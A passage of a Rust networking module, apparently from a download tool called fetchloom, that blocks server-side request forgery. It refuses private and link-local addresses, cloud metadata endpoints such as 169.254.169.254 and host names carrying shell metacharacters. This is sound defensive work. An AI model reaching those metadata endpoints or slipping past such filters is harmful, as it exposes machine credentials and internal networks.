//! where a request may go. only the origins a person typed, named as a mirror or listed in
//! `allowed_origins` may reach private addresses, so a cloned project, a hostile server or a
//! tampered lock cannot reach into a local network.

use std::borrow::Cow;
use std::collections::{HashMap, HashSet};
use std::ffi::OsString;
use std::fmt;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
use std::sync::{Arc, Mutex};

use hyper_util::client::proxy::matcher::Matcher;
use url::{Host, Url};

use crate::error::Error;
use crate::shown::Shown;

/// the origins a person typed, named or allowed, and the proxies this machine sends requests
/// through.
#[derive(Clone, Default)]
pub(crate) struct Typed(Arc<Mutex<Hosts>>);

#[derive(Default)]
struct Hosts {
    /// exact origins: another port or scheme of the same host is not trusted.
    origins: HashSet<url::Origin>,
    /// a proxy may sit on a private address, and only reaching it is allowed: a URL that asks
    /// for the proxy's host itself, as a redirect could, is refused unless its origin is trusted.
    proxies: HashSet<String>,
    /// the `allowed_origins` setting, which a refusal quotes.
    allowed: Allowed,
    /// names this run's lookups for a trusted origin found on a private address.
    private: HashSet<String>,
    /// those of them found on a link-local or metadata address, as [`is_metadata`] says.
    metadata: HashSet<String>,
    /// names this run's lookups found, which a lookup that later says they do not exist cannot
    /// make unknown: a mac whose network is gone is said to answer every lookup so.
    resolved: HashSet<String>,
}

/// the `allowed_origins` setting as refusals and hints quote it: the origins it lists and how a
/// person changes it.
#[derive(Clone, Debug, Default)]
pub(crate) struct Allowed {
    pub(crate) origins: Vec<url::Origin>,
    /// only `FETCHLOOM_ALLOWED_ORIGINS` changes it for this run: it is set, and wins over the
    /// settings file, or `--no-config` or `FETCHLOOM_NO_CONFIG` leaves the file unread.
    pub(crate) by_variable: bool,
}

impl Allowed {
    /// how to let a later run reach `origin` too: the setting's whole value with `origin` added,
    /// saved with `settings set` or as one run's variable, or the variable alone when only it
    /// changes the setting.
    pub(crate) fn remedy(&self, origin: &url::Origin) -> String {
        self.remedy_for(origin, cfg!(windows))
    }

    /// [`Allowed::remedy`] for powershell on `windows`, where `$env:` sets the variable for the
    /// terminal, or for bash, zsh and fish, which read it written before the command for that
    /// run alone, and pasted on a line of its own would keep it from every command.
    pub(crate) fn remedy_for(&self, origin: &url::Origin, windows: bool) -> String {
        let mut listed: Vec<String> = self
            .origins
            .iter()
            .map(url::Origin::ascii_serialization)
            .collect();
        let origin = origin.ascii_serialization();
        if !listed.contains(&origin) {
            listed.push(origin);
        }
        let value = listed.join(",");
        let variable = if windows {
            format!(
                "run `$env:FETCHLOOM_ALLOWED_ORIGINS = '{}'` first",
                value.replace('\'', "''")
            )
        } else {
            format!(
                "put `FETCHLOOM_ALLOWED_ORIGINS={}` before the command",
                crate::suggested::shell_word_for(&value, false)
            )
        };
        if self.by_variable {
            return variable;
        }
        let words: Vec<String> = listed
            .iter()
            .map(|origin| crate::suggested::shell_word_for(origin, windows).into_owned())
            .collect();
        let alone = if windows {
            "for this terminal alone"
        } else {
            "for that run alone"
        };
        format!(
            "save it with `{}`, or {variable} {alone}",
            crate::suggested::anywhere(&format!(
                "settings set allowed_origins {}",
                words.join(" ")
            ))
        )
    }
}

/// which addresses the lookups of one HTTP client may keep.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Reach {
    /// any address of a host a trusted origin is on, for requests to a trusted origin.
    Trusted,
    /// public addresses alone, for every other request.
    Public,
}

impl Typed {
    /// trusts the origin of `url`, as a test server standing in for a source needs.
    #[cfg(debug_assertions)]
    pub(crate) fn add(&self, url: &Url) {
        self.allow([url.origin()]);
    }

    /// lets the proxy at `host` be reached, wherever its address is.
    fn add_proxy(&self, host: &str) {
        self.hosts().proxies.insert(key(host));
    }

    /// lets requests reach `origins`, wherever they are: those the `allowed_origins` setting
    /// lists, and those of the links and mirrors a person gives.
    pub(crate) fn allow(&self, origins: impl IntoIterator<Item = url::Origin>) {
        self.hosts().origins.extend(origins);
    }

    /// lets requests reach the origins `allowed` lists, and keeps it for refusals to quote.
    fn set_allowed(&self, allowed: Allowed) {
        let mut hosts = self.hosts();
        hosts.origins.extend(allowed.origins.iter().cloned());
        hosts.allowed = allowed;
    }

    /// whether `origin` is on a private address: its host is one written out, or a name this
    /// run's lookups for a trusted origin found on one. nothing is looked up for it.
    pub(crate) fn on_private_address(&self, origin: &url::Origin) -> bool {
        let url::Origin::Tuple(_, host, _) = origin else {
            return false;
        };
        match host {
            Host::Ipv4(ip) => is_private(IpAddr::V4(*ip)),
            Host::Ipv6(ip) => is_private(IpAddr::V6(*ip)),
            Host::Domain(name) => self.hosts().private.contains(&key(name)),
        }
    }

    /// whether `origin` is on a link-local or metadata address, as [`is_metadata`] says: its host
    /// is one written out, or a name this run's lookups for a trusted origin found on one.
    pub(crate) fn on_metadata_address(&self, origin: &url::Origin) -> bool {
        let url::Origin::Tuple(_, host, _) = origin else {
            return false;
        };
        match host {
            Host::Ipv4(ip) => is_metadata(IpAddr::V4(*ip)),
            Host::Ipv6(ip) => is_metadata(IpAddr::V6(*ip)),
            Host::Domain(name) => self.hosts().metadata.contains(&key(name)),
        }
    }

    /// the refusal of `host`'s private address, `reason`, which `allowed_origins` can lift,
    /// offering no command that lists it for `no_command`.
    fn refused(&self, reason: String, host: &str, no_command: Option<NoCommand>) -> Refused {
        self.hosts().refused(reason, &key(host), no_command)
    }

    /// whether the origin of `url` is trusted.
    pub(crate) fn trusts(&self, url: &Url) -> bool {
        self.hosts().origins.contains(&url.origin())
    }

    /// whether the `allowed_origins` setting lists the origin of `url`.
    pub(crate) fn allows(&self, url: &Url) -> bool {
        self.hosts().allowed.origins.contains(&url.origin())
    }

    /// whether `host` may resolve to a private address for a client that keeps `reach`: a proxy
    /// may for every client, a host a trusted origin is on only for the trusted client.
    fn may_resolve_privately(&self, host: &str, reach: Reach) -> bool {
        let key = key(host);
        let hosts = self.hosts();
        hosts.proxies.contains(&key) || (reach == Reach::Trusted && hosts.trusts_on(&key))
    }

    fn hosts(&self) -> std::sync::MutexGuard<'_, Hosts> {
        self.0
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
    }

    /// refuses a URL whose host is a private address written out, or a proxy's host, unless its
    /// origin is trusted, and any whose name holds a character no host name has. names are
    /// checked later, on the addresses they resolve to.
    pub(crate) fn check(&self, url: &Url) -> Result<(), Refused> {
        // no setting lets a request use another scheme, so the refusal names none
        if !matches!(url.scheme(), "http" | "https") {
            return Err(Refused::new("fetchloom speaks http and https alone"));
        }
        let Some(host) = url.host_str() else {
            return Err(Refused::new(format!("{} has no host", Shown(url))));
        };
        // the url crate lets `$`, `(`, `;` and the like into a name, which a command fetchloom
        // suggests with the host in it would hand to a shell
        if let Some(Host::Domain(name)) = url.host()
            && !name.bytes().all(|byte| {
                byte.is_ascii_lowercase() || byte.is_ascii_digit() || b"._-".contains(&byte)
            })
        {
            return Err(Refused::new(
                "its host name holds a character no host name has",
            ));
        }
        let hosts = self.hosts();
        if hosts.origins.contains(&url.origin()) {
            return Ok(());
        }
        let host = key(host);
        if hosts.proxies.contains(&host) {
            return Err(hosts.refused(PROXY_ASKED.to_owned(), &host, None));
        }
        let ip = match url.host() {
            Some(Host::Ipv4(ip)) => IpAddr::V4(ip),
            Some(Host::Ipv6(ip)) => IpAddr::V6(ip),
            _ => return Ok(()),
        };
        if is_private(ip) {
            return Err(hosts.refused(
                format!("it points at the private address {ip}"),
                &host,
                is_metadata(ip).then_some(NoCommand::Metadata),
            ));
        }
        Ok(())
    }
}

impl super::Net {
    /// lets requests reach the origins the `allowed_origins` setting lists, wherever they are,
    /// and has refusals quote the setting.
    pub(crate) fn with_allowed_origins(self, allowed: Allowed) -> super::Net {
        self.typed.set_allowed(allowed);
        self
    }

    /// whether `origin` is on a private address, as far as its host or this run's lookups say.
    pub(crate) fn on_private_address(&self, origin: &url::Origin) -> bool {
        self.typed.on_private_address(origin)
    }

    /// whether `origin` is on a link-local or metadata address, as [`is_metadata`] says, as far
    /// as its host or this run's lookups say.
    pub(crate) fn on_metadata_address(&self, origin: &url::Origin) -> bool {
        self.typed.on_metadata_address(origin)
    }

    /// the refusal a request for `url` meets before it is sent, as a private address written out
    /// that no trusted origin covers; a name's address is known only once it is looked up.
    pub(crate) fn refusal(&self, url: &Url) -> Option<crate::error::Error> {
        let reason = self.typed.check(url).err()?;
        Some(super::failure::refused(url, &reason))
    }
}

impl Hosts {
    /// the refusal of `host`'s private address, `reason`, naming the origins trusted on `host`,
    /// given as [`key`] makes it, and quoting `allowed_origins`, which can lift it, in a command
    /// unless `no_command` says why none is offered.
    fn refused(&self, reason: String, host: &str, no_command: Option<NoCommand>) -> Refused {
        Refused {
            reason,
            trusted_on_host: self.origins_on(host),
            allowed: Some(self.allowed.clone()),
            no_command,
        }
    }

    /// whether a trusted origin is on `host`, given as [`key`] makes it.
    fn trusts_on(&self, host: &str) -> bool {
        self.origins.iter().any(|origin| is_on(origin, host))
    }

    /// the trusted origins on `host`, given as [`key`] makes it, sorted as messages show them.
    fn origins_on(&self, host: &str) -> Vec<String> {
        let mut on: Vec<String> = self
            .origins
            .iter()
            .filter(|origin| is_on(origin, host))
            .map(url::Origin::ascii_serialization)
            .collect();
        on.sort();
        on
    }
}

/// whether `origin` is on `host`, given as [`key`] makes it.
fn is_on(origin: &url::Origin, host: &str) -> bool {
    match origin {
        url::Origin::Tuple(_, on, _) => key(&on.to_string()) == host,
        url::Origin::Opaque(_) => false,
    }
}

/// a host as the sets keep it: lowercase, an IPv6 address without its brackets.
fn key(host: &str) -> String {
    host.trim_start_matches('[')
        .trim_end_matches(']')
        .to_ascii_lowercase()
}
/// a request fetchloom will not make, with the reason in one sentence.
#[derive(Debug)]
pub(crate) struct Refused {
    reason: String,
    /// for a private address, the origins trusted on the same host, as messages show them: a
    /// person may have expected one of them to cover this URL too.
    pub(crate) trusted_on_host: Vec<String>,
    /// the `allowed_origins` setting, for a refusal that listing the origin there lifts.
    pub(crate) allowed: Option<Allowed>,
    /// why the refusal offers no command that lists the origin in `allowed_origins`, when it
    /// offers none.
    pub(crate) no_command: Option<NoCommand>,
}

/// why a refusal offers no command a person could paste to let the request through.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum NoCommand {
    /// the address is link-local or a cloud's metadata service, as [`is_metadata`] says.
    Metadata,
    /// a name of a private network this machine cannot look up, which may lead to one, as
    /// metadata.google.internal does.
    Unseen,
}

impl Refused {
    /// a refusal no setting lifts, such as a link without a host.
    pub(crate) fn new(reason: impl Into<String>) -> Refused {
        Refused {
            reason: reason.into(),
            trusted_on_host: Vec::new(),
            allowed: None,
            no_command: None,
        }
    }
}

impl fmt::Display for Refused {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.reason)
    }
}

impl std::error::Error for Refused {}

/// a request made while offline. it never leaves the machine.
#[derive(Debug)]
pub(crate) struct Offline;

impl fmt::Display for Offline {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str("offline")
    }
}

impl std::error::Error for Offline {}

/// a host name no DNS server knows, which trying again will not change.
#[derive(Debug)]
pub(crate) struct Unknown(pub(crate) String);

impl fmt::Display for Unknown {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{} is not a known host", self.0)
    }
}

impl std::error::Error for Unknown {}

/// a lookup DNS could not answer for now, as a machine whose network is gone gets.
#[derive(Debug)]
pub(crate) struct Unanswered(pub(crate) std::io::Error);

impl fmt::Display for Unanswered {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        self.0.fmt(f)
    }
}

impl std::error::Error for Unanswered {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        Some(&self.0)
    }
}

/// a test's DNS: what a lookup of each name finds, or why it fails.
#[cfg(test)]
pub(crate) type Lookups = Arc<dyn Fn(&str) -> std::io::Result<Vec<SocketAddr>> + Send + Sync>;

/// whether a failed lookup said the name does not exist, rather than that DNS could not answer.
/// on unix only getaddrinfo's message says so, worded differently by glibc, musl and macos.
fn is_unknown(err: &std::io::Error) -> bool {
    if cfg!(windows) {
        // WSAHOST_NOT_FOUND and WSANO_DATA
        return matches!(err.raw_os_error(), Some(11001 | 11004));
    }
    let text = err.to_string();
    [
        "Name or service not known",
        "No address associated with hostname",
        "Name does not resolve",
        "Name has no usable address",
        "nodename nor servname provided, or not known",
    ]
    .iter()
    .any(|said| text.contains(said))
}

/// the proxies this machine is set to use, chosen for each URL the way reqwest chooses them, and
/// what looking up the hosts sent through them found.
pub(crate) struct Proxies {
    matcher: Matcher,
    /// `NO_PROXY` lists `*`, so every request goes straight to its host.
    direct: bool,
    /// each variable that names a proxy, with the proxy it names, as the matcher reads them.
    named: Vec<(&'static str, http::Uri)>,
    /// what looking up each host found.
    looked_up: Mutex<HashMap<String, Looked>>,
    /// what this run decided about each proxy it checked, by host and port.
    checked: Mutex<HashMap<(String, u16), reach::Verdict>>,
    #[cfg(test)]
    test_lookup: Option<TestLookup>,
    #[cfg(test)]
    test_probe: Option<TestProbe>,
}

/// why a link to a proxy's own host is refused.
const PROXY_ASKED: &str = "it asks for the proxy this machine sends requests through";

/// the proxy variables, each pair in the order the proxy matcher reads it: the lowercase name
/// counts only when the uppercase one is unset.
const VARIABLES: [[&str; 2]; 3] = [
    ["HTTPS_PROXY", "https_proxy"],
    ["HTTP_PROXY", "http_proxy"],
    ["ALL_PROXY", "all_proxy"],
];

/// the proxy each set variable names, none for an empty one. a value the matcher cannot read,
/// which it would treat as unset, is refused, so requests never go around a proxy a person set.
///
/// # Errors
///
/// `usage`, naming the first variable whose value is no proxy address.
fn named(var: &dyn Fn(&str) -> Option<OsString>) -> Result<Vec<(&'static str, http::Uri)>, Error> {
    let mut named = Vec::new();
    for pair in VARIABLES {
        let Some((name, value)) = pair
            .into_iter()
            .find_map(|name| var(name).map(|value| (name, value)))
        else {
            continue;
        };
        if value.is_empty() {
            continue;
        }
        match value.to_str().and_then(proxy_address) {
            Some(uri) => named.push((name, uri)),
            None => return Err(not_proxy(name, &value.to_string_lossy())),
        }
    }
    Ok(named)
}

/// whether `NO_PROXY`, or `no_proxy` when it is unset, lists `*`, which reaches every host
/// without a proxy, as curl reads it.
fn reaches_all(var: &dyn Fn(&str) -> Option<OsString>) -> bool {
    ["NO_PROXY", "no_proxy"]
        .into_iter()
        .find_map(var)
        .is_some_and(|value| {
            value
                .to_string_lossy()
                .split(',')
                .any(|entry| entry.trim() == "*")
        })
}

/// the proxy `value` names, as the matcher reads a proxy variable: an http, https or socks
/// address, or a host and port alone. none when the matcher cannot read it.
fn proxy_address(value: &str) -> Option<http::Uri> {
    let matcher = Matcher::builder().all(value.to_owned()).build();
    let intercept = matcher.intercept(&http::Uri::from_static("http://example.org/"))?;
    Some(intercept.uri().clone())
}

/// the refusal of `value`, the setting of `name` that is no proxy address.
fn not_proxy(name: &str, value: &str) -> Error {
    Error::new(
        crate::error::Kind::Usage,
        format!(
            "{name} is \"{}\", which is not a proxy address",
            without_login(value).escape_debug()
        ),
    )
    .help(format!(
        "set {name} to a proxy, such as http://proxy.example.org:8080, or unset {name} to connect without one. `{}` lists the proxy settings",
        crate::suggested::anywhere("help environment")
    ))
}

/// a proxy setting as messages show it: whatever comes before an `@` is a login, which `***`
/// stands for, whether or not the rest is an address.
fn without_login(value: &str) -> Cow<'_, str> {
    let Some(at) = value.rfind('@') else {
        return Cow::Borrowed(value);
    };
    let start = value.find("://").map_or(0, |scheme| scheme + 3);
    if start > at {
        return Cow::Borrowed(value);
    }
    Cow::Owned(format!("{}***{}", &value[..start], &value[at..]))
}

#[cfg(test)]
pub(super) type LookupFuture =
    std::pin::Pin<Box<dyn std::future::Future<Output = Option<String>> + Send>>;
#[cfg(test)]
type TestLookup = Arc<dyn Fn(String, u16) -> LookupFuture + Send + Sync>;
#[cfg(test)]
type ProbeFuture = std::pin::Pin<Box<dyn std::future::Future<Output = Probe> + Send>>;
#[cfg(test)]
type TestProbe = Arc<dyn Fn(String, u16) -> ProbeFuture + Send + Sync>;

/// the proxy this machine sends `url` through, as the proxy variables and the system's settings
/// name it. none when the request goes straight to the host.
pub(crate) fn carrier_of(url: &Url) -> Option<Carrier> {
    Proxies::read(&|name| std::env::var_os(name))
        .ok()?
        .carrier(url)
}

/// a proxy's address as messages show it: its scheme, host and port, without a login.
fn shown(proxy: &http::Uri) -> Option<String> {
    let scheme = proxy.scheme_str().unwrap_or("http");
    let host = proxy.host()?;
    Some(match proxy.port_u16() {
        Some(port) => format!("{scheme}://{host}:{port}"),
        None => format!("{scheme}://{host}"),
    })
}

#[cfg(test)]
mod proxy_tests;
mod reach;

pub(crate) use reach::Carrier;
#[cfg(test)]
use reach::Probe;

impl Proxies {
    /// the proxies in the environment `var` reads and, where reqwest reads them, the system
    /// settings.
    ///
    /// # Errors
    ///
    /// `usage` for a proxy variable whose value is no proxy address.
    pub(crate) fn read(var: &dyn Fn(&str) -> Option<OsString>) -> Result<Proxies, Error> {
        // the matcher takes `*` for every name but no address, as `127.0.0.1`
        let direct = reaches_all(var);
        let matcher = if direct {
            Matcher::builder().build()
        } else {
            Matcher::from_system()
        };
        Ok(Proxies {
            matcher,
            direct,
            named: named(var)?,
            looked_up: Mutex::default(),
            checked: Mutex::default(),
            #[cfg(test)]
            test_lookup: None,
            #[cfg(test)]
            test_probe: None,
        })
    }

    /// checks `url` before a proxy carries it: the proxy resolves names itself, so an untrusted
    /// host is looked up here first and refused when any address is private. a name this machine
    /// cannot look up goes to the proxy, as where only the proxy resolves names, unless it looks
    /// like a host of a private network; then only its exact origin, typed or in
    /// `allowed_origins`, goes.
    pub(crate) async fn check(&self, url: &Url, typed: &Typed) -> Result<(), Refused> {
        let Some(proxy) = url
            .as_str()
            .parse::<http::Uri>()
            .ok()
            .and_then(|uri| self.matcher.intercept(&uri))
        else {
            return self.straight(url, typed);
        };
        if let Some(host) = proxy.uri().host() {
            typed.add_proxy(host);
        }
        let Some(Host::Domain(name)) = url.host() else {
            return Ok(());
        };
        let name = name.to_ascii_lowercase();
        if typed.trusts(url) {
            return Ok(());
        }
        let known = self.lock().get(&name).cloned();
        let looked = if let Some(looked) = known {
            looked
        } else {
            let port = url.port_or_known_default().unwrap_or(443);
            let looked = self.lookup(&name, port).await;
            self.lock().insert(name.clone(), looked.clone());
            looked
        };
        match looked {
            Looked::Unknown if looks_internal(&name) => Err(typed.refused(
                format!(
                    "this machine cannot look up {name}, a name of a private network, so only the proxy knows where it leads"
                ),
                &name,
                Some(NoCommand::Unseen),
            )),
            Looked::Public | Looked::Unknown => Ok(()),
            Looked::Private(reason, metadata) => Err(typed.refused(
                reason,
                &name,
                metadata.then_some(NoCommand::Metadata),
            )),
        }
    }

    /// whether every request goes straight to its host, as `NO_PROXY=*` says, so the client
    /// must not route by the variables itself.
    pub(super) fn direct(&self) -> bool {
        self.direct
    }

    /// refuses `url`, which goes straight to its host, when that host is a proxy's and no person
    /// trusted its origin: once any request went through the proxy, lookups keep its private
    /// address for every client, and checking only then would let one at the same time through.
    fn straight(&self, url: &Url, typed: &Typed) -> Result<(), Refused> {
        let Some(host) = url.host_str().map(key) else {
            return Ok(());
        };
        if typed.trusts(url) || !self.hosts().contains(&host) {
            return Ok(());
        }
        Err(typed.refused(PROXY_ASKED.to_owned(), &host, None))
    }

    /// the hosts of the proxies requests go through, as [`key`] gives them: those the variables
    /// name, and those the system's settings name for a request of either scheme.
    fn hosts(&self) -> Vec<String> {
        let named = self
            .named
            .iter()
            .filter(|_| !self.direct)
            .filter_map(|(_, proxy)| proxy.host().map(key));
        ["http://fetchloom.invalid/", "https://fetchloom.invalid/"]
            .into_iter()
            .filter_map(|probe| self.matcher.intercept(&http::Uri::from_static(probe)))
            .filter_map(|proxy| proxy.uri().host().map(key))
            .chain(named)
            .collect()
    }

    #[cfg(test)]
    pub(super) fn with_lookup(
        proxy: &str,
        lookup: impl Fn(String, u16) -> LookupFuture + Send + Sync + 'static,
    ) -> Proxies {
        Proxies {
            matcher: Matcher::builder().all(proxy.to_owned()).build(),
            direct: false,
            named: Vec::new(),
            looked_up: Mutex::default(),
            checked: Mutex::default(),
            test_lookup: Some(Arc::new(lookup)),
            test_probe: None,
        }
    }

    /// the proxy at `proxy`, named by `variable`, whose checks `probe` answers.
    #[cfg(test)]
    fn with_probe(
        variable: &'static str,
        proxy: &str,
        probe: impl Fn(String, u16) -> ProbeFuture + Send + Sync + 'static,
    ) -> Proxies {
        Proxies {
            matcher: Matcher::builder().all(proxy.to_owned()).build(),
            direct: false,
            named: proxy_address(proxy)
                .map(|uri| vec![(variable, uri)])
                .unwrap_or_default(),
            looked_up: Mutex::default(),
            checked: Mutex::default(),
            test_lookup: None,
            test_probe: Some(Arc::new(probe)),
        }
    }

    async fn lookup(&self, name: &str, port: u16) -> Looked {
        #[cfg(test)]
        if let Some(lookup) = &self.test_lookup {
            return lookup(name.to_owned(), port)
                .await
                .map_or(Looked::Public, |reason| Looked::Private(reason, false));
        }
        system_lookup(name, port).await
    }

    fn lock(&self) -> std::sync::MutexGuard<'_, HashMap<String, Looked>> {
        self.looked_up
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
    }
}

/// what this machine's lookup of a name a proxy would carry found.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Looked {
    /// public addresses alone.
    Public,
    /// a private address, which the proxy would reach, for this reason, and whether it is a
    /// link-local or metadata address, as [`is_metadata`] says.
    Private(String, bool),
    /// no address: a split dns, or a name such as metadata.google.internal, leads where only the
    /// proxy knows.
    Unknown,
}

/// the endings of names no public dns serves: kept for local or special use, or used inside
/// private networks.
const INTERNAL: [&str; 11] = [
    "internal",
    "local",
    "localhost",
    "lan",
    "home.arpa",
    "corp",
    "intranet",
    "private",
    "localdomain",
    "test",
    "invalid",
];

/// whether `name` looks like a host of a private network: one label, as a bare `intranet` is, or
/// an ending in [`INTERNAL`], as metadata.google.internal has.
pub(crate) fn looks_internal(name: &str) -> bool {
    let name = name.trim_end_matches('.');
    !name.contains('.')
        || INTERNAL.iter().any(|ending| {
            name.strip_suffix(ending)
                .is_some_and(|rest| rest.is_empty() || rest.ends_with('.'))
        })
}

/// what this machine's lookup of `name` at `port` finds.
async fn system_lookup(name: &str, port: u16) -> Looked {
    let found = tokio::net::lookup_host((name, port)).await;
    looked(name, found.map(Iterator::collect))
}

/// what looking up `name` `found`.
fn looked(name: &str, found: std::io::Result<Vec<SocketAddr>>) -> Looked {
    let Some(found) = found.ok().filter(|found| !found.is_empty()) else {
        return Looked::Unknown;
    };
    match found.iter().find(|address| is_private(address.ip())) {
        Some(address) => Looked::Private(
            format!(
                "{name} resolves to the private address {}, and a proxy would reach it",
                address.ip()
            ),
            found.iter().any(|address| is_metadata(address.ip())),
        ),
        None => Looked::Public,
    }
}

/// resolves names for one HTTP client, keeping the private addresses only that its `reach`
/// allows.
pub(crate) struct Resolver {
    typed: Typed,
    offline: bool,
    reach: Reach,
    #[cfg(test)]
    lookups: Option<Lookups>,
}

impl Resolver {
    pub(crate) fn new(typed: Typed, offline: bool, reach: Reach) -> Resolver {
        Resolver {
            typed,
            offline,
            reach,
            #[cfg(test)]
            lookups: None,
        }
    }

    /// lookups answered by `lookups` instead of DNS, for tests of a network that comes and goes.
    #[cfg(test)]
    pub(crate) fn answering(mut self, lookups: Option<Lookups>) -> Resolver {
        self.lookups = lookups;
        self
    }
}

impl reqwest::dns::Resolve for Resolver {
    fn resolve(&self, name: reqwest::dns::Name) -> reqwest::dns::Resolving {
        let host = name.as_str().to_ascii_lowercase();
        let allowed = self.typed.may_resolve_privately(&host, self.reach);
        let typed = self.typed.clone();
        let offline = self.offline;
        let reach = self.reach;
        #[cfg(test)]
        let answered = self.lookups.as_ref().map(|lookups| lookups(&host));
        #[cfg(not(test))]
        let answered = None;
        Box::pin(async move {
            if offline {
                return Err(Box::new(Offline) as Box<dyn std::error::Error + Send + Sync>);
            }
            let looked_up = match answered {
                Some(answer) => answer,
                None => tokio::net::lookup_host((host.as_str(), 0))
                    .await
                    .map(Iterator::collect),
            };
            let found: Vec<SocketAddr> = match looked_up {
                Ok(found) => found,
                Err(err) if is_unknown(&err) && typed.hosts().resolved.contains(&host) => {
                    return Err(
                        Box::new(Unanswered(err)) as Box<dyn std::error::Error + Send + Sync>
                    );
                }
                Err(err) if is_unknown(&err) => {
                    return Err(
                        Box::new(Unknown(host.clone())) as Box<dyn std::error::Error + Send + Sync>
                    );
                }
                Err(err) if err.kind() == std::io::ErrorKind::InvalidInput => {
                    return Err(Box::new(err) as Box<dyn std::error::Error + Send + Sync>);
                }
                Err(err) => {
                    return Err(
                        Box::new(Unanswered(err)) as Box<dyn std::error::Error + Send + Sync>
                    );
                }
            };
            let kept: Vec<SocketAddr> = found
                .iter()
                .copied()
                .filter(|address| allowed || !is_private(address.ip()))
                .collect();
            if kept.is_empty() && !found.is_empty() {
                let refused = typed.refused(
                    format!("{host} resolves only to private addresses"),
                    &host,
                    found
                        .iter()
                        .any(|address| is_metadata(address.ip()))
                        .then_some(NoCommand::Metadata),
                );
                return Err(Box::new(refused) as Box<dyn std::error::Error + Send + Sync>);
            }
            // noted so an add can say its typed origin needs allowed_origins later, with no
            // lookup of its own
            let mut hosts = typed.hosts();
            if reach == Reach::Trusted && kept.iter().any(|address| is_private(address.ip())) {
                hosts.private.insert(key(&host));
            }
            if reach == Reach::Trusted && kept.iter().any(|address| is_metadata(address.ip())) {
                hosts.metadata.insert(key(&host));
            }
            hosts.resolved.insert(host);
            drop(hosts);
            Ok(Box::new(kept.into_iter()) as reqwest::dns::Addrs)
        })
    }
}

/// whether this machine has a route out of itself, as linux's routing tables list them: `None`
/// where it cannot tell, so only a machine shown to have no route at all counts as one without a
/// network.
#[cfg(target_os = "linux")]
pub(crate) fn routed() -> Option<bool> {
    let read = |path| std::fs::read_to_string(path).ok();
    routed_by(
        read("/proc/net/route").as_deref(),
        read("/proc/net/ipv6_route").as_deref(),
    )
}

/// [`routed`] where no routing table can be read.
#[cfg(not(target_os = "linux"))]
pub(crate) fn routed() -> Option<bool> {
    None
}

/// [`routed`] from linux's ipv4 and ipv6 routing tables, `four` and `six` as `/proc/net/route`
/// and `/proc/net/ipv6_route` list them, either `None` where it could not be read. a route out in
/// either shows a network; none shows there is none only where both were read, the ipv4 one with
/// its head line, since a table this machine could not read may hold the route.
#[cfg(any(target_os = "linux", test))]
fn routed_by(four: Option<&str>, six: Option<&str>) -> Option<bool> {
    let four = four.filter(|four| four.starts_with("Iface"));
    if four.is_some_and(four_routes_out) || six.is_some_and(six_routes_out) {
        Some(true)
    } else if four.is_some() && six.is_some() {
        Some(false)
    } else {
        None
    }
}

/// whether a route that is up, and no rejection, goes through `iface`, which is not loopback,
/// with `flags` as linux's routing tables write them.
#[cfg(any(target_os = "linux", test))]
fn usable(iface: &str, flags: &str) -> bool {
    const UP: u32 = 0x1;
    const REJECT: u32 = 0x200;
    iface != "lo"
        && u32::from_str_radix(flags, 16).is_ok_and(|flags| flags & UP != 0 && flags & REJECT == 0)
}

/// whether linux's ipv4 routing table, `/proc/net/route`, holds a [`usable`] route.
#[cfg(any(target_os = "linux", test))]
fn four_routes_out(table: &str) -> bool {
    table.lines().skip(1).any(|line| {
        let fields: Vec<&str> = line.split_whitespace().collect();
        matches!(fields[..], [iface, _, _, flags, ..] if usable(iface, flags))
    })
}

/// whether linux's ipv6 routing table, `/proc/net/ipv6_route`, holds a [`usable`] route other
/// than a link-local or multicast one, which every interface that is up has, on a network or not.
#[cfg(any(target_os = "linux", test))]
fn six_routes_out(table: &str) -> bool {
    table.lines().any(|line| {
        let fields: Vec<&str> = line.split_whitespace().collect();
        matches!(fields[..], [to, _, _, _, _, _, _, _, flags, iface]
        if usable(iface, flags)
            && u128::from_str_radix(to, 16).is_ok_and(|to| {
                let to = Ipv6Addr::from(to);
                !to.is_multicast() && !to.is_unicast_link_local()
            }))
    })
}

/// addresses of this machine or its local network rather than the internet. 198.18.0.0/15 stays
/// public: clash and mihomo answer every name with a fake address there.
pub(crate) fn is_private(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(ip) => {
            let [first, second, third, _] = ip.octets();
            let shared = first == 100 && (second & 0xc0) == 64;
            // 192.0.0.0/24 holds oracle cloud's instance metadata at 192.0.0.192
            let protocol = first == 192 && second == 0 && third == 0;
            ip.is_private()
                || ip.is_loopback()
                || ip.is_link_local()
                || ip.is_unspecified()
                || ip.is_broadcast()
                || ip.is_multicast()
                || ip.is_documentation()
                || shared
                || protocol
                || first == 0
                || first >= 240
        }
        IpAddr::V6(ip) => {
            ip.is_loopback()
                || ip.is_unspecified()
                || ip.is_multicast()
                || ip.is_unique_local()
                || ip.is_unicast_link_local()
                || documentation(ip)
                || site_local(ip)
                || ip
                    .to_ipv4()
                    .or_else(|| nat64(ip))
                    .or_else(|| six_to_four(ip))
                    .is_some_and(|mapped| is_private(IpAddr::V4(mapped)))
                || local_nat64(ip)
        }
    }
}

/// whether `ip` is link-local, or where a cloud keeps the metadata service that hands each machine
/// its own keys: `169.254.169.254` and the rest of `169.254.0.0/16`, `fe80::/10`, oracle's
/// `192.0.0.192`, alibaba's `100.100.100.200` and aws's `fd00:ec2::254`, in IPv6 forms of them
/// too. no dataset is served there, so a refusal offers no command that lets a request through.
pub(crate) fn is_metadata(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(ip) => {
            ip.is_link_local()
                || ip == Ipv4Addr::new(192, 0, 0, 192)
                || ip == Ipv4Addr::new(100, 100, 100, 200)
        }
        IpAddr::V6(ip) => {
            ip.is_unicast_link_local()
                || ip == Ipv6Addr::new(0xfd00, 0xec2, 0, 0, 0, 0, 0, 0x254)
                || ip
                    .to_ipv4()
